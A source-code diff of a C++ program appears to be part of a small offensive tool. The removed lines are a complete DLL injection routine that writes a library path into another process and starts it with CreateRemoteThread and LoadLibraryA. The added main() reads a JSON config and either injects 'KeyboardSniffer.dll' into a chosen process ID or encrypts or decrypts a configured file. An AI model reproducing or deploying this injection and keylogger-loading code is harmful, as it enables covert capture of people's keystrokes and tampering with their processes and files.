@@ -1,35 +1,47 @@
-#include "pch.h"
-#include "Inject.h"
-#include <string>
+﻿#include <iostream>
+#include <json.hpp>
+#include <fstream>
+#include "Injector.h"
+#include "Cryptographer.h"
 
-void inject_DLL(const char* file_name, int PID)
+using namespace std;
+using json = nlohmann::json;
+
+int main()
 {
-    HANDLE h_process, h_rThread;
-    char fullDLLPath[260];
-    LPVOID DLLPath_addr, LoadLib_addr;
-    DWORD exit_code;
+	ifstream file("param.json");//при сборке из визуалки указывать полный путь 
 
-    h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+	char* writable = new char[0];
+	json j;
+	file >> j;
 
-    GetFullPathNameA(file_name, 260, fullDLLPath, NULL);
+	string pathFile = j["pathProgramm"].get<string>();
+	if (pathFile != "")
+	{
+		writable = new char[pathFile.size() + 1];
+		copy(pathFile.begin(), pathFile.end(), writable);
+		writable[pathFile.size()] = '\0';
+	}
 
-    DLLPath_addr = VirtualAllocEx(h_process, NULL, 260,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	
 
-    WriteProcessMemory(h_process, DLLPath_addr, fullDLLPath,
-        strlen(fullDLLPath), NULL);
-
-    LoadLib_addr = GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");
-
-    h_rThread = CreateRemoteThread(h_process, NULL, 0,
-        (LPTHREAD_START_ROUTINE)LoadLib_addr, DLLPath_addr, 0, NULL);
-
-    WaitForSingleObject(h_rThread, INFINITE);
-
-    GetExitCodeThread(h_rThread, &exit_code);
-
-
-    CloseHandle(h_rThread);
-    VirtualFreeEx(h_process, DLLPath_addr, 0, MEM_RELEASE);
-    CloseHandle(h_process);
+	switch (j["tpyeProgramm"].get<int>())
+	{
+		case 1:
+			inject_DLL("KeyboardSniffer.dll", j["PID"].get<int>());
+			break;
+		case 2:
+			switch (j["typeEncoderOperation"].get<int>())
+			{
+				case 1:
+					EncryptionFile(writable);
+					break;
+				case 2:
+					DecryptionFile(writable);
+					break;
+			}
+			delete[] writable;
+			break;
+	}
 }
+
